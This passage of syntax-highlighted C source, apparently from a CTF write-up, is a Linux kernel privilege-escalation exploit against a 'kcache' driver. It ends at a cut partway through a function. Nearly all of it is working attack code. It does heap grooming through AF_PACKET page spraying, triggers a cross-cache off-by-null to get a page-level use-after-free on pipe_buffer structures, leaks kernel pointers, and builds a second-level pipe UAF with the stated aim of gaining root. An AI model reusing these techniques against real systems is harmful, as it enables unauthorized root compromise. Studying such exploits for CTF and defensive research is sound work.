class="hljs-keyword">define</span> KCACHE_NUM 0x10</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KCACHE_ALLOC 0x114</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KCACHE_APPEND 0x514</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KCACHE_READ 0x1919</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KCACHE_FREE 0x810</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kcache_cmd</span> &#123;</span><br>    <span class="hljs-type">int</span> idx;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> sz;<br>    <span class="hljs-type">void</span> *buf;<br>&#125;;<br><br><span class="hljs-type">int</span> dev_fd;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">kcache_alloc</span><span class="hljs-params">(<span class="hljs-type">int</span> index, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size, <span class="hljs-type">char</span> *buf)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kcache_cmd</span> <span class="hljs-title">cmd</span> =</span> &#123;<br>        .idx = index,<br>        .sz = size,<br>        .buf = buf,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> ioctl(dev_fd, KCACHE_ALLOC, &amp;cmd);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">kcache_append</span><span class="hljs-params">(<span class="hljs-type">int</span> index, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size, <span class="hljs-type">char</span> *buf)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kcache_cmd</span> <span class="hljs-title">cmd</span> =</span> &#123;<br>        .idx = index,<br>        .sz = size,<br>        .buf = buf,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> ioctl(dev_fd, KCACHE_APPEND, &amp;cmd);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">kcache_read</span><span class="hljs-params">(<span class="hljs-type">int</span> index, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size, <span class="hljs-type">char</span> *buf)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kcache_cmd</span> <span class="hljs-title">cmd</span> =</span> &#123;<br>        .idx = index,<br>        .sz = size,<br>        .buf = buf,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> ioctl(dev_fd, KCACHE_READ, &amp;cmd);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">kcache_free</span><span class="hljs-params">(<span class="hljs-type">int</span> index)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kcache_cmd</span> <span class="hljs-title">cmd</span> =</span> &#123;<br>        .idx = index,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> ioctl(dev_fd, KCACHE_FREE, &amp;cmd);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * III -  pgv pages sprayer related </span><br><span class="hljs-comment"> * not that we should create two process:</span><br><span class="hljs-comment"> * - the parent is the one to send cmd and get root</span><br><span class="hljs-comment"> * - the child creates an isolate userspace by calling unshare_setup(),</span><br><span class="hljs-comment"> *      receiving cmd from parent and operates it only</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGV_PAGE_NUM 1000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PACKET_VERSION 10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PACKET_TX_RING 13</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tpacket_req</span> &#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_block_size;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_block_nr;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_frame_size;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_frame_nr;<br>&#125;;<br><br><span class="hljs-comment">/* each allocation is (size * nr) bytes, aligned to PAGE_SIZE */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pgv_page_request</span> &#123;</span><br>    <span class="hljs-type">int</span> idx;<br>    <span class="hljs-type">int</span> cmd;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr;<br>&#125;;<br><br><span class="hljs-comment">/* operations type */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>    CMD_ALLOC_PAGE,<br>    CMD_FREE_PAGE,<br>    CMD_EXIT,<br>&#125;;<br><br><span class="hljs-comment">/* tpacket version for setsockopt */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">tpacket_versions</span> &#123;</span><br>    TPACKET_V1,<br>    TPACKET_V2,<br>    TPACKET_V3,<br>&#125;;<br><br><span class="hljs-comment">/* pipe for cmd communication */</span><br><span class="hljs-type">int</span> cmd_pipe_req[<span class="hljs-number">2</span>], cmd_pipe_reply[<span class="hljs-number">2</span>];<br><br><span class="hljs-comment">/* create a socket and alloc pages, return the socket fd */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">create_socket_and_alloc_pages</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tpacket_req</span> <span class="hljs-title">req</span>;</span><br>    <span class="hljs-type">int</span> socket_fd, version;<br>    <span class="hljs-type">int</span> ret;<br><br>    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);<br>    <span class="hljs-keyword">if</span> (socket_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)\n&quot;</span>);<br>        ret = socket_fd;<br>        <span class="hljs-keyword">goto</span> err_out;<br>    &#125;<br><br>    version = TPACKET_V1;<br>    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, <br>                     &amp;version, <span class="hljs-keyword">sizeof</span>(version));<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed at setsockopt(PACKET_VERSION)\n&quot;</span>);<br>        <span class="hljs-keyword">goto</span> err_setsockopt;<br>    &#125;<br><br>    <span class="hljs-built_in">memset</span>(&amp;req, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(req));<br>    req.tp_block_size = size;<br>    req.tp_block_nr = nr;<br>    req.tp_frame_size = <span class="hljs-number">0x1000</span>;<br>    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;<br><br>    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &amp;req, <span class="hljs-keyword">sizeof</span>(req));<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed at setsockopt(PACKET_TX_RING)\n&quot;</span>);<br>        <span class="hljs-keyword">goto</span> err_setsockopt;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> socket_fd;<br><br>err_setsockopt:<br>    close(socket_fd);<br>err_out:<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-comment">/* the parent process should call it to send command of allocation to child */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">alloc_page</span><span class="hljs-params">(<span class="hljs-type">int</span> idx, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pgv_page_request</span> <span class="hljs-title">req</span> =</span> &#123;<br>        .idx = idx,<br>        .cmd = CMD_ALLOC_PAGE,<br>        .size = size,<br>        .nr = nr,<br>    &#125;;<br>    <span class="hljs-type">int</span> ret;<br><br>    write(cmd_pipe_req[<span class="hljs-number">1</span>], &amp;req, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pgv_page_request));<br>    read(cmd_pipe_reply[<span class="hljs-number">0</span>], &amp;ret, <span class="hljs-keyword">sizeof</span>(ret));<br><br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-comment">/* the parent process should call it to send command of freeing to child */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">free_page</span><span class="hljs-params">(<span class="hljs-type">int</span> idx)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pgv_page_request</span> <span class="hljs-title">req</span> =</span> &#123;<br>        .idx = idx,<br>        .cmd = CMD_FREE_PAGE,<br>    &#125;;<br>    <span class="hljs-type">int</span> ret;<br><br>    write(cmd_pipe_req[<span class="hljs-number">1</span>], &amp;req, <span class="hljs-keyword">sizeof</span>(req));<br>    read(cmd_pipe_reply[<span class="hljs-number">0</span>], &amp;ret, <span class="hljs-keyword">sizeof</span>(ret));<br><br>    usleep(<span class="hljs-number">10000</span>);<br><br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-comment">/* the child, handler for commands from the pipe */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">spray_cmd_handler</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pgv_page_request</span> <span class="hljs-title">req</span>;</span><br>    <span class="hljs-type">int</span> socket_fd[PGV_PAGE_NUM];<br>    <span class="hljs-type">int</span> ret;<br><br>    <span class="hljs-comment">/* create an isolate namespace*/</span><br>    unshare_setup();<br><br>    <span class="hljs-comment">/* handler request */</span><br>    <span class="hljs-keyword">do</span> &#123;<br>        read(cmd_pipe_req[<span class="hljs-number">0</span>], &amp;req, <span class="hljs-keyword">sizeof</span>(req));<br><br>        <span class="hljs-keyword">if</span> (req.cmd == CMD_ALLOC_PAGE) &#123;<br>            ret = create_socket_and_alloc_pages(req.size, req.nr);<br>            socket_fd[req.idx] = ret;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (req.cmd == CMD_FREE_PAGE) &#123;<br>            ret = close(socket_fd[req.idx]);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] invalid request: %d\n&quot;</span>, req.cmd);<br>        &#125;<br><br>        write(cmd_pipe_reply[<span class="hljs-number">1</span>], &amp;ret, <span class="hljs-keyword">sizeof</span>(ret));<br>    &#125; <span class="hljs-keyword">while</span> (req.cmd != CMD_EXIT);<br>&#125;<br><br><span class="hljs-comment">/* init pgv-exploit subsystem :) */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">prepare_pgv_system</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">/* pipe for pgv */</span><br>    pipe(cmd_pipe_req);<br>    pipe(cmd_pipe_reply);<br>    <br>    <span class="hljs-comment">/* child process for pages spray */</span><br>    <span class="hljs-keyword">if</span> (!fork()) &#123;<br>        spray_cmd_handler();<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * IV - config for page-level heap spray and heap fengshui</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_SPRAY_NUM 200</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGV_1PAGE_SPRAY_NUM 0x20</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGV_4PAGES_START_IDX PGV_1PAGE_SPRAY_NUM</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGV_4PAGES_SPRAY_NUM 0x40</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGV_8PAGES_START_IDX (PGV_4PAGES_START_IDX + PGV_4PAGES_SPRAY_NUM)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGV_8PAGES_SPRAY_NUM 0x40</span><br><br><span class="hljs-type">int</span> pgv_1page_start_idx = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> pgv_4pages_start_idx = PGV_4PAGES_START_IDX;<br><span class="hljs-type">int</span> pgv_8pages_start_idx = PGV_8PAGES_START_IDX;<br><br><span class="hljs-comment">/* spray pages in different size for various usages */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">prepare_pgv_pages</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * We want a more clear and continuous memory there, which require us to </span><br><span class="hljs-comment">     * make the noise less in allocating order-3 pages.</span><br><span class="hljs-comment">     * So we pre-allocate the pages for those noisy objects there.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray pgv order-0 pages...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PGV_1PAGE_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (alloc_page(i, <span class="hljs-number">0x1000</span>, <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray pgv order-2 pages...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PGV_4PAGES_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (alloc_page(PGV_4PAGES_START_IDX + i, <span class="hljs-number">0x1000</span> * <span class="hljs-number">4</span>, <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* spray 8 pages for page-level heap fengshui */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray pgv order-3 pages...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PGV_8PAGES_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-comment">/* a socket need 1 obj: sock_inode_cache, 19 objs for 1 slub on 4 page*/</span><br>        <span class="hljs-keyword">if</span> (i % <span class="hljs-number">19</span> == <span class="hljs-number">0</span>) &#123;<br>            free_page(pgv_4pages_start_idx++);<br>        &#125;<br><br>        <span class="hljs-comment">/* a socket need 1 dentry: dentry, 21 objs for 1 slub on 1 page */</span><br>        <span class="hljs-keyword">if</span> (i % <span class="hljs-number">21</span> == <span class="hljs-number">0</span>) &#123;<br>            free_page(pgv_1page_start_idx += <span class="hljs-number">2</span>);<br>        &#125;<br><br>        <span class="hljs-comment">/* a pgv need 1 obj: kmalloc-8, 512 objs for 1 slub on 1 page*/</span><br>        <span class="hljs-keyword">if</span> (i % <span class="hljs-number">512</span> == <span class="hljs-number">0</span>) &#123;<br>            free_page(pgv_1page_start_idx += <span class="hljs-number">2</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (alloc_page(PGV_8PAGES_START_IDX + i, <span class="hljs-number">0x1000</span> * <span class="hljs-number">8</span>, <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">/* for pipe escalation */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SND_PIPE_BUF_SZ 96</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TRD_PIPE_BUF_SZ 192</span><br><br><span class="hljs-type">int</span> pipe_fd[PIPE_SPRAY_NUM][<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> orig_pid = <span class="hljs-number">-1</span>, victim_pid = <span class="hljs-number">-1</span>;<br><span class="hljs-type">int</span> snd_orig_pid = <span class="hljs-number">-1</span>, snd_vicitm_pid = <span class="hljs-number">-1</span>;<br><span class="hljs-type">int</span> self_2nd_pipe_pid = <span class="hljs-number">-1</span>, self_3rd_pipe_pid = <span class="hljs-number">-1</span>, self_4th_pipe_pid = <span class="hljs-number">-1</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> <span class="hljs-title">info_pipe_buf</span>;</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">extend_pipe_buffer_to_4k</span><span class="hljs-params">(<span class="hljs-type">int</span> start_idx, <span class="hljs-type">int</span> nr)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nr; i++) &#123;<br>        <span class="hljs-comment">/* let the pipe_buffer to be allocated on order-3 pages (kmalloc-4k) */</span><br>        <span class="hljs-keyword">if</span> (i % <span class="hljs-number">8</span> == <span class="hljs-number">0</span>) &#123;<br>            free_page(pgv_8pages_start_idx++);<br>        &#125;<br><br>        <span class="hljs-comment">/* a pipe_buffer on 1k is for 16 pages, so 4k for 64 pages */</span><br>        <span class="hljs-keyword">if</span> (fcntl(pipe_fd[start_idx + i][<span class="hljs-number">1</span>], F_SETPIPE_SZ, <span class="hljs-number">0x1000</span> * <span class="hljs-number">64</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to extend %d pipe!\n&quot;</span>, start_idx + i);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *  V - FIRST exploit stage - cross-cache overflow to make page-level UAF</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">corrupting_first_level_pipe_for_page_uaf</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x1000</span>];<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i ++) &#123;<br><br>        <span class="hljs-keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to alloc %d pipe!&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to create pipe!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* spray pipe_buffer on order-2 pages, make vul-obj slub around with that.*/</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] exetend pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (extend_pipe_buffer_to_4k(<span class="hljs-number">0</span>, PIPE_SPRAY_NUM / <span class="hljs-number">2</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to extend pipe!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray vulnerable 2k obj...&quot;</span>);<br>    free_page(pgv_8pages_start_idx++);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; KCACHE_NUM; i++) &#123;<br>        kcache_alloc(i, <span class="hljs-number">8</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] exetend pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (extend_pipe_buffer_to_4k(PIPE_SPRAY_NUM / <span class="hljs-number">2</span>, PIPE_SPRAY_NUM / <span class="hljs-number">2</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to extend pipe!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] allocating pipe pages...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);  <span class="hljs-comment">/* prevent pipe_release() */</span><br>    &#125;<br><br>    <span class="hljs-comment">/* try to trigger cross-cache overflow */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] trigerring cross-cache off-by-null...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; KCACHE_NUM; i++) &#123;<br>        kcache_append(i, KCACHE_SIZE - <span class="hljs-number">8</span>, buf);<br>    &#125;<br><br>    <span class="hljs-comment">/* checking for cross-cache overflow */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] checking for corruption...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-type">char</span> a3_str[<span class="hljs-number">0x10</span>];<br>        <span class="hljs-type">int</span> nr;<br><br>        <span class="hljs-built_in">memset</span>(a3_str, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(a3_str));<br>        read(pipe_fd[i][<span class="hljs-number">0</span>], a3_str, <span class="hljs-number">8</span>);<br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;nr, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(a3_str, <span class="hljs-string">&quot;arttnba3&quot;</span>) &amp;&amp; nr != i) &#123;<br>            orig_pid = nr;<br>            victim_pid = i;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found victim: \033[0m%d &quot;</span><br>                   <span class="hljs-string">&quot;\033[32m\033[1m, orig: \033[0m%d\n\n&quot;</span>, <br>                   victim_pid, orig_pid);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (victim_pid == <span class="hljs-number">-1</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to corrupt pipe_buffer!&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">corrupting_second_level_pipe_for_pipe_uaf</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">size_t</span> snd_pipe_sz = <span class="hljs-number">0x1000</span> * (SND_PIPE_BUF_SZ/<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer));<br><br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(buf));<br><br>    <span class="hljs-comment">/* let the page&#x27;s ptr at pipe_buffer */</span><br>    write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], buf, SND_PIPE_BUF_SZ*<span class="hljs-number">2</span> - <span class="hljs-number">24</span> - <span class="hljs-number">3</span>*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br><br>    <span class="hljs-comment">/* free orignal pipe&#x27;s page */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] free original pipe...&quot;</span>);<br>    close(pipe_fd[orig_pid][<span class="hljs-number">0</span>]);<br>    close(pipe_fd[orig_pid][<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-comment">/* try to rehit victim page by reallocating pipe_buffer */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fcntl() to set the pipe_buffer on victim page...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (fcntl(pipe_fd[i][<span class="hljs-number">1</span>], F_SETPIPE_SZ, snd_pipe_sz) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to resize %d pipe!\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to re-alloc pipe_buffer!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* read victim page to check whether we&#x27;ve successfully hit it */</span><br>    read(pipe_fd[victim_pid][<span class="hljs-number">0</span>], buf, SND_PIPE_BUF_SZ - <span class="hljs-number">8</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>    read(pipe_fd[victim_pid][<span class="hljs-number">0</span>], &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(info_pipe_buf));<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;page: \033[0m%p\n&quot;</span> <br>           <span class="hljs-string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;ops: \033[0m%p\n&quot;</span>, <br>           info_pipe_buf.page, info_pipe_buf.ops);<br><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-type">size_t</span>) info_pipe_buf.page &lt; <span class="hljs-number">0xffff000000000000</span><br>        || (<span class="hljs-type">size_t</span>) info_pipe_buf.ops &lt; <span class="hljs-number">0xffffffff81000000</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to re-hit victim page!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successfully to hit the UAF page!\033[0m&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got page leak:\033[0m %p\n&quot;</span>, info_pipe_buf.page);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br><br>    <span class="hljs-comment">/* construct a second-level page uaf */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] construct a second-level uaf pipe page...&quot;</span>);<br>    info_pipe_buf.page = (<span class="hljs-keyword">struct</span> page*) ((<span class="hljs-type">size_t</span>) info_pipe_buf.page + <span class="hljs-number">0x40</span>);<br>    write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(info_pipe_buf));<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-type">int</span> nr;<br><br>        <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;nr, <span class="hljs-keyword">sizeof</span>(nr));<br>        <span class="hljs-keyword">if</span> (nr &lt; PIPE_SPRAY_NUM &amp;&amp; i != nr) &#123;<br>            snd_orig_pid = nr;<br>            snd_vicitm_pid = i;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found second-level victim: \033[0m%d &quot;</span><br>                   <span class="hljs-string">&quot;\033[32m\033[1m, orig: \033[0m%d\n&quot;</span>, <br>                   snd_vicitm_pid, snd_orig_pid);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (snd_vicitm_pid == <span class="hljs-number">-1</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to 